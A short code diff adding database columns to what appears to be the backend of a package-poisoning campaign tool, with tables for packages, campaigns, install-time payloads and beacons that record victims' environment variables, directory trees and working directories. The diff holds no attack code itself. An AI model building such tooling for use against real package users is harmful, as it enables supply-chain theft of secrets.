@@ -102,6 +102,8 @@ try { db.exec('ALTER TABLE packages ADD COLUMN role TEXT'); } catch (_) {}
 try { db.exec('ALTER TABLE campaigns ADD COLUMN payload_id INTEGER REFERENCES payloads(id)'); } catch (_) {}
 try { db.exec('ALTER TABLE campaigns ADD COLUMN split_analysis TEXT'); } catch (_) {}
 try { db.exec('ALTER TABLE packages ADD COLUMN publish_files TEXT'); } catch (_) {}
+try { db.exec("ALTER TABLE payloads ADD COLUMN lang TEXT NOT NULL DEFAULT 'js'"); } catch (_) {}
+try { db.exec('ALTER TABLE beacons ADD COLUMN custom_data TEXT'); } catch (_) {}
 
 // Seed default settings (INSERT OR IGNORE — first boot only)
 const seedSetting = db.prepare('INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)');
@@ -153,6 +155,7 @@ export type Payload = {
   name: string;
   description: string | null;
   install_js: string;
+  lang: 'js' | 'ts';
   builtin: number;
   created_at: number;
 };
@@ -203,6 +206,7 @@ export type Beacon = {
   dir_tree: string | null;
   env_vars: string | null;
   cwd: string | null;
+  custom_data: string | null;
   last_seen: number;
   created_at: number;
   kill: number;
